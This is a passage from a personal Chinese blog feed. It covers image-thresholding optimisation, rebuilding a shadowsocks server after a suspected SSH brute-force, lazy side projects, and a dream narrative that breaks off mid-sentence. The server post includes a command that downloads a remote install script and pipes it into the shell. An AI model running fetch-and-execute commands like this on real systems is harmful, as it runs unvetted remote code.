    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;B&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;COUNT&lt;/span&gt;
    &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;inv_value&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看看计算时间，  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
Image shape 640x480
optimized_vector_method take 10.539570999999999 ms
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;比最初快了150倍， 而且超过了论文上的C语言实现的15ms的时间。  &lt;/p&gt;
&lt;h2 id="_8"&gt;&lt;a name="user-content-_8" href="#_8" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;总结分析&lt;/h2&gt;
&lt;p&gt;对于最后的这个方法， 需要额外解释一下为什么会比论文快。&lt;br /&gt;
其中一个是CPU的原因， 论文上用的是4核奔腾3.4Ghz的CPU，而我自己的是i5 2.7GHz。&lt;br /&gt;
i5应该是快一些的， （我猜）&lt;/p&gt;
&lt;p&gt;之后是在对窗口大小的计算时间上， 因为我们通过填充扩展矩阵， 使得每一个点的窗口大小都是固定的值， 比论文中的方法省去了多余的窗口大小计算和多余的边界判断。&lt;br /&gt;
但是扩展矩阵在计算累积和的时候有额外的时间消耗， boxsize默认采用边长的1/8， &lt;br /&gt;
构造后的矩阵比原先大了 81/64 倍的大小。&lt;br /&gt;
不过在之后的计算中并没有额外的消耗。  &lt;/p&gt;
&lt;p&gt;再次， 虽然我们构造出了4个矩阵ABCD， 但是实际上没有对内存做拷贝， ABCD都是累积和矩阵上的映射， 没有对内存中的实际数据做拷贝。&lt;/p&gt;
&lt;p&gt;最后，   &lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;integral_map = integral_map.astype(np.uint32)
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
我指定了矩阵中的元素的大小， 统一为无符号32位， 速度又得到了一定的提升。&lt;br /&gt;
但是uint32有其局限， 只能存下2^32次方的数据， 灰度图的每一个点的最大取值是2^8， 于是uint32的累积矩阵只能存下2^24个像素点， 然而由于填充了边框， 矩阵比实际大了81/64， 约1.266倍， &lt;code&gt;sqrt(2^24/1.266) = 3640&lt;/code&gt;,  所以只能处理3640x3640的图片， 但是从平均情况来说， 每一个点平均取2^7， 于是我们可以处理最大5148x5148的图片。&lt;/p&gt;
&lt;p&gt;到此， 完成了从最初的1600ms到10ms的优化。  &lt;/p&gt;
&lt;h2 id="_9"&gt;&lt;a name="user-content-_9" href="#_9" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;彩蛋&lt;/h2&gt;
&lt;p&gt;混沌邪恶  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cv2&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;cv&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wtf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;# 这才叫Python嘛！&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;adaptiveThreshold&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ADAPTIVE_THRESH_GAUSSIAN_C&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;THRESH_BINARY_INV&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;咕咕咕？？？&lt;br /&gt;
我选择opencv自带的局部自适应高斯二值化&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implent.py
Image shape 640x480
wtf take 8.884578000000001 ms
&lt;/pre&gt;&lt;/div&gt;</summary><category term="python"></category><category term="numpy"></category></entry><entry><title>记一次服务器被爆破后灾后重建ss的经历</title><link href="http://littlezz.github.io/ji-yi-ci-fu-wu-qi-bei-bao-po-hou-zai-hou-zhong-jian-ssde-jing-li.html" rel="alternate"></link><updated>2016-11-18T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-11-18:ji-yi-ci-fu-wu-qi-bei-bao-po-hou-zai-hou-zhong-jian-ssde-jing-li.html</id><summary type="html">&lt;h2 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;疑似被黑&lt;/h2&gt;
&lt;p&gt;2年前和基友合力租了一台服务器用于搭建ss服务， 当年啥也不懂， 系统选的是fedora， yum install fail2ban之后主要精力就是折腾ss， 配了supervisord， 编译了hybla的模块， 就不管了。  &lt;/p&gt;
&lt;p&gt;2年来一直没出什么大事， 偶尔大面积100%丢包过一下就好了， 没当回事。  &lt;/p&gt;
&lt;p&gt;直到昨天因为系统更新准备重新编译hybla， 登录上去顺便用网上抄了的命令查看了一下当前连接量， &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;netstat -an | grep 443 | grep ESTABLISHED | wc -l
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;大的惊人， 开始慌了。  &lt;/p&gt;
&lt;p&gt;检查log日志， 发现大量&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;2016-11-16 01:16:01 ERROR can not parse header when handling connection from ::ffff:&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;反查这些ip， 发现都不是我们自己的ip。&lt;br /&gt;
我估计是被爆破了， 但是我端口用的是443， 所以也不太好确定是不是真的被爆破。&lt;br /&gt;
之后就是ban ip， 换端口， 改密码。  &lt;/p&gt;
&lt;p&gt;接着开始考虑服务器本身有没有被攻破， 看了一下ssh的22端口， 发现有其他的ip在建立连接， 到这里我都没有特别慌张， 我想， 我还有fail2ban呢。  &lt;/p&gt;
&lt;p&gt;检查了一下我的fail2ban， 发现处于开启失败状态。&lt;br /&gt;
顺带， ssh服务没换端口， 允许root账号登录， 允许密码登录。&lt;/p&gt;
&lt;p&gt;『卧槽， 精彩了』  &lt;/p&gt;
&lt;p&gt;赶紧联系大腿。&lt;/p&gt;
&lt;p&gt;先打&lt;code&gt;w&lt;/code&gt;命令， 一片空白， 一般登录了的话至少有自己一个人， 现在什么也没有， 六神表示&lt;code&gt;w&lt;/code&gt;估计被改了， 可能是被rootkit了， rootkit了的话基本就很难看出其他的东西了。  &lt;/p&gt;
&lt;p&gt;往后是一些挣扎， 检查&lt;code&gt;ps -aux&lt;/code&gt;， 看不出来。&lt;br /&gt;
检查&lt;code&gt;who -a /var/log/wtmp&lt;/code&gt;, 看一下登录的信息， 看不出来。&lt;br /&gt;
检查bash_history, zsh_history， 根本懒得看了。  &lt;/p&gt;
&lt;p&gt;淦他娘啊， 我选择重装！  &lt;/p&gt;
&lt;h2 id="_2"&gt;&lt;a name="user-content-_2" href="#_2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;灾后重建&lt;/h2&gt;
&lt;p&gt;这次选了ubuntu， 而且有经验了。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;先装&lt;code&gt;zsh&lt;/code&gt;, &lt;code&gt;apt-get install zsh&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;建立用户, 指定shell为zsh， &lt;code&gt;useradd youruser -m -s /bin/zsh&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上传公钥， 通过 &lt;code&gt;ssh-copy-id&lt;/code&gt; 命令。  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;更改ssh的配置， 改端口， 关root登录， 关密码登录。  &lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;PermitRootLogin no
Port 12345
PasswordAuthentication no
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
* 重启ssh服务。  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安装 &lt;code&gt;denyhosts&lt;/code&gt;, &lt;code&gt;apt-get install denyhosts&lt;/code&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;oh-my-zsh&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apt-get install git
sh -c &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="ss"&gt;&lt;a name="user-content-ss" href="#ss" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;配置ss&lt;/h2&gt;
&lt;h4 id="pip-shadowsocks"&gt;&lt;a name="user-content-pip-shadowsocks" href="#pip-shadowsocks" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;更新系统， 装&lt;code&gt;pip&lt;/code&gt;， &lt;code&gt;shadowsocks&lt;/code&gt;&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apt-get install python-pip
pip install -U pip
pip install shadowsocks
&lt;/pre&gt;&lt;/div&gt;


&lt;h4 id="libsodium"&gt;&lt;a name="user-content-libsodium" href="#libsodium" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;安装密码库， 安装&lt;code&gt;libsodium&lt;/code&gt;依赖&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;apt-get install python-m2crypto
apt-get install libsodium18
pip install M2Crypto
&lt;/pre&gt;&lt;/div&gt;


&lt;h4 id="etcshadowsocksjson"&gt;&lt;a name="user-content-etcshadowsocksjson" href="#etcshadowsocksjson" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;配置&lt;code&gt;/etc/shadowsocks.json&lt;/code&gt;&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;::&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;server_port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8899&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;local_address&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;local_port&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1080&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;lt;choose a method&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;fast_open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;workers&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nobody&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;服务器参数设置&lt;code&gt;"::"&lt;/code&gt;可以同时监听ipv4和ipv6, user设置nobody权限， 选一个加密方式， 另外最新是可以打开OTA来防止被攻击， 但是需要客户端也支持OTA。 &lt;/p&gt;
&lt;p&gt;除此以外， 还可以用提供的 &lt;a href="https://github.com/shadowsocks/shadowsocks/blob/master/utils/autoban.py"&gt;autoban.py&lt;/a&gt; 来ban ip,使用方法参考&lt;a href="https://github.com/shadowsocks/shadowsocks/wiki/Ban-Brute-Force-Crackers"&gt;Ban Brute Force Crackers&lt;/a&gt; .&lt;br /&gt;
注意到同时监听ipv4和ipv6的时候， 这个代码提取ip的方式有问题，要改一下，&lt;br /&gt;
第41行改成  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ip = line.split()[-1].split(&amp;#39;:&amp;#39;)[-2]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;（小心不要把自己ban了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;br&gt;  &lt;/p&gt;
&lt;h4 id="_3"&gt;&lt;a name="user-content-_3" href="#_3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;关于优化&lt;/h4&gt;
&lt;p&gt;参考  &lt;a href="https://github.com/iMeiji/shadowsocks_install/wiki/shadowsocks-optimize"&gt;shadowsocks-optimize&lt;/a&gt;, 不重复了  &lt;/p&gt;
&lt;h4 id="_4"&gt;&lt;a name="user-content-_4" href="#_4" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;配置开机自启动&lt;/h4&gt;
&lt;p&gt;rc.local ubuntu用不了， 需要自己写一个&lt;code&gt;shadowsocks.service&lt;/code&gt;:&lt;br /&gt;
在&lt;code&gt;/etc/systemd/system&lt;/code&gt;下建立一个文件， 比如&lt;code&gt;shadowsocks.service&lt;/code&gt;， 写入如下内容  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[Unit]&lt;/span&gt;
&lt;span class="na"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;run ssserver on background&lt;/span&gt;

&lt;span class="k"&gt;[Service]&lt;/span&gt;
&lt;span class="na"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;forking&lt;/span&gt;
&lt;span class="na"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/usr/local/bin/ssserver -c /etc/shadowsocks.json -d restart&lt;/span&gt;
&lt;span class="na"&gt;ExecStop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;/usr/local/bin/ssserver -c /etc/shadowsocks.json -d stop&lt;/span&gt;

&lt;span class="k"&gt;[Install]&lt;/span&gt;
&lt;span class="na"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;multi-user.target&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;参考： &lt;br /&gt;
&lt;a href="https://unix.stackexchange.com/questions/47695/how-to-write-startup-script-for-systemd"&gt;how-to-write-startup-script-for-systemd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.freedesktop.org/software/systemd/man/systemd.service.html"&gt;systemd.service.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;按说明， &lt;code&gt;Type&lt;/code&gt;选&lt;code&gt;forking&lt;/code&gt;而不是&lt;code&gt;simple&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;之后可以用&lt;code&gt;systemctl start shadowsocks&lt;/code&gt; 和&lt;code&gt;systemctl stop shadowsocks&lt;/code&gt; 开关ss.  &lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;systemctl enable shadowsocks&lt;/code&gt; 让ss开机启动。&lt;/p&gt;
&lt;h2 id="_5"&gt;&lt;a name="user-content-_5" href="#_5" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;总结&lt;/h2&gt;
&lt;p&gt;&lt;del&gt;在被日中成长&lt;/del&gt;。  &lt;/p&gt;</summary></entry><entry><title>懒</title><link href="http://littlezz.github.io/lan.html" rel="alternate"></link><updated>2016-08-17T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-08-17:lan.html</id><summary type="html">&lt;p&gt;&lt;img alt="" src="../images/need_fix.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;最近太懒了， 之前写的几个练手的项目， 有一些没有放到github上面就已经弃坑了， 至于一些开的坑， 也处于长期不填的状态。  &lt;/p&gt;
&lt;p&gt;最近在准备写一个即时聊天的网站来练手，前端用reactjs， 后端是aiohttp， 数据库mongodb，  主要是想体验一把分布式的Websocket 和Python3.5 的&lt;code&gt;await/async&lt;/code&gt;语法的。但是按现在的进度看来要花大把的时间在前端上面了， 我一年前不知道为什么两个元素会上下排列， 一年后还是不知道为什么。  &lt;/p&gt;
&lt;p&gt;前端， 总是给我一种五五开的『这他妈是什么， 这他妈又是什么』的感觉。&lt;/p&gt;
&lt;p&gt;不久前写过一个chrome的插件&lt;a href="https://github.com/littlezz/PixivFast"&gt;PixivFast&lt;/a&gt;， 用来让我在p站刷图时可以不用点开大图之后再右键另存为， 而是按一下&lt;code&gt;s&lt;/code&gt;就可以弹出下载大图的会话框。 实用， 但是没放到google商店上， 而且我还想着再加一个同时给10分评分的功能， 于是就一直拖着。目前有一名忠实的用户——我自己， 不过由于没有在google商店上面发布， 每次重启浏览器都得重新安装插件， 就现状看来， 这个『忠实』的用户也快叛变了。  &lt;/p&gt;
&lt;p&gt;还有一个备份A岛讨论串的爬虫， &lt;a href="https://github.com/littlezz/island-backup"&gt;island-backup&lt;/a&gt;, 用aiohttp写的。当初野心勃勃， 如今也只是剩下几个自己开的issue没关， kukuku岛禁用api接口之后我懒得再管, 于是现在只能用于主岛。甚至github上面代码到了v1.1.2， 但是pypi上面还是停留在v1.0.1。&lt;br /&gt;
懒到不想打包。  &lt;/p&gt;
&lt;p&gt;其实api接口禁用之后解析html就好了， 懒。 我之前写过一个搜索出A岛回复数超过一定量的串的程序， 当时是有精力啊， 支持A岛， 哭哭哭岛， 备胎岛， 甚至是K岛， 里面有socks的代理设置， 而且还图形化了，用的是自带的tk。 然后呢？mac上面的tk有问题， 触摸板双指滑动tk就崩， 我自己的mac上面下载了新的tk， 没有问题，  后来兴致勃勃的跑去给蛋蛋试用， 他从github上克隆好程序装好所需的依赖， 启动之后双指一上滑， Duang！ &lt;/p&gt;
&lt;p&gt;我和他解释啊， 这不是我的锅啊， 这是tk的锅啊， tk的锅啊， 底层的锅啊， 我救不了啊。 &lt;/p&gt;
&lt;p&gt;你要不装个新的tk试试？ &lt;/p&gt;
&lt;p&gt;他给了我一个关爱智障的眼神。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="../images/2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;这个项目后来也不了了之了， 我自己都不用。  &lt;/p&gt;
&lt;p&gt;后来还写了一个&lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESL-Model&lt;/a&gt;, 这东西我都不想说， 现在都快成黑历史了， 我原先计划把那本 The Elements of statistical Learning 上面的方法全部实现一遍的， 后来大概止步于卷积神经网络的那个patch和步长不能刚好走完一层， 比如书上说patch 3x3, 每次走两格， 但是那一层是16x16， 不能刚好走完啊。我看那个cs231也是刚好能够走完一层的， 于是我就懵逼了啊。&lt;br /&gt;
彼时日常生活也发生了些事情， 我没有精力再搞， 于是放了两个月， 到得现在大概是放弃了。 彻底是一个坑了。&lt;/p&gt;
&lt;p&gt;唉都是借口， 都是懒。  &lt;/p&gt;
&lt;p&gt;我还是计划一下之后怎么办吧，虽然都是练手， 没什么时间的要求， 但是老拖下去也不是办法。  &lt;/p&gt;
&lt;p&gt;至少：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pixivfast 给弄完交钱注册个账号放到google商店上。  &lt;/li&gt;
&lt;li&gt;island_backup 把issue清了。  &lt;/li&gt;
&lt;li&gt;计划的练手的项目给写了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;先这样吧。&lt;/p&gt;
&lt;p&gt;2016年08月17日18:17:19&lt;/p&gt;</summary><category term="日记"></category><category term="瞎扯"></category><category term="小结"></category></entry><entry><title>回家</title><link href="http://littlezz.github.io/hui-jia.html" rel="alternate"></link><updated>2016-06-05T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-06-05:hui-jia.html</id><summary type="html">&lt;p&gt;我在上课。&lt;br /&gt;
如同之前我上过的无数的课一样， 我完全没有在听。  &lt;/p&gt;
&lt;p&gt;老师要求我们在书本上做题， 之后使用像超市里面的条形码扫描器一样的机器在书本上一扫， 平时分就出来了。  &lt;/p&gt;
&lt;p&gt;当然， 这种机器看上去高级， 但总是给人一种玩具的感觉。有些人的分数就是飘忽不定， 一会儿是二十几分， 一会儿是六十几分， 这取决于使用扫描器时的角度， 是个依赖耐心和运气的活儿。   &lt;br /&gt;
不过使用者虽然有耐心， 但是其他同学还在等着用啊， 于是乱糟糟的， 催别人快一些的， 拿高分的发表扫描器使用经验谈的， 拿低分大叫不公平等着再试一次的。  &lt;/p&gt;
&lt;p&gt;看够了， 我才发现我不知道教材是什么， 看看邻座的，还好， 我桌子上有了一本， 可是完全不知道要写哪里。&lt;br /&gt;
此时老师已经拿着扫描仪走到我旁边了， 我还没有找到对应的页数， 一把抽过邻座的书， 74页， 我看了一下自己的书， 第71页， 赶紧一翻， 老师也在这时走到了我身旁。  &lt;/p&gt;
&lt;p&gt;我希望他没有看到我空空如也的书本， 对他说先检查邻座的吧。  &lt;/p&gt;
&lt;p&gt;末了， 老师说时间不够了， 没有检查的同学下课了过去找他。我松了一口气， 赶紧对着邻座的书本抄， 题目是填写一个巨大且数目繁多的表格。  &lt;/p&gt;
&lt;p&gt;放学后走在回家的路上， 我带着耳机， 放着the pillows的《one life》，和一个女生并肩走着， 我低着头看我的脚抬起又落下， 配合着节拍， 正当我觉得风景正好， 晚霞染红了半片天， 心情舒畅， 斗志昂扬的时候， 我想起这样带着耳机和一个女孩走路不太礼貌， 继而我突然想到我忘记去给老师检查我的作业了。&lt;/p&gt;
&lt;p&gt;于是事情最终演变成了我摘下耳机， 停下了脚步， 在兴奋劲还没有散去的脸上新添了一份略带惶恐的表情：『完了， 我忘记给老师检查了， 平时分没有了。  』&lt;/p&gt;
&lt;p&gt;女孩或许说了些什么， 我没在听， 但是我才注意到我喜欢这个女孩， 但是他是不是我的女朋友呢， 好像也不是， 我们可能是在恋爱期吧。  &lt;/p&gt;
&lt;p&gt;我觉得没有什么比现在和女孩一起走在回家的路上更重要的了， 瞬间忘光了检查作业的事情， 毕竟， 现在回学校也没有什么用了。  &lt;/p&gt;
&lt;p&gt;到了一处池塘， 池塘旁边放满了五花八门的脸盆和塑料桶。 这个池塘里面有各种各样的鱼， 以黑色的草鱼为主。 一个无主的池塘， 鱼儿平时可能就吃一些水草吧， 所以鱼饵一下去， 立马咬钩， 但是钓上来的鱼却总是又肥又大， 池塘旁边的各式各样的盆和桶用于给垂钓者临时存放钓上来的鱼， 偶尔来得早了还能发现几根普通的『随手』杆。  总之， 一个免费且设施齐全的自助鱼塘。  &lt;/p&gt;
&lt;p&gt;我们商量着钓一条鱼回去， 取了一根鱼竿， 立马就钓上来了一条， 这时我才发现没有准备好保存鱼的桶。  &lt;/p&gt;
&lt;p&gt;我用手握着黏糊糊的挣扎着的鱼， 问女孩， 你愿意拿着鱼还是愿意打一桶水？  &lt;/p&gt;
&lt;p&gt;女孩看着鱼， 不语。  &lt;/p&gt;
&lt;p&gt;都不愿意？  &lt;/p&gt;
&lt;p&gt;女孩点了点头。  &lt;/p&gt;
&lt;p&gt;我四处望了望， 看到一个老同学也在钓鱼， 身旁放着一个盆和一个细长的桶， 看来他今天收获不小。&lt;br /&gt;
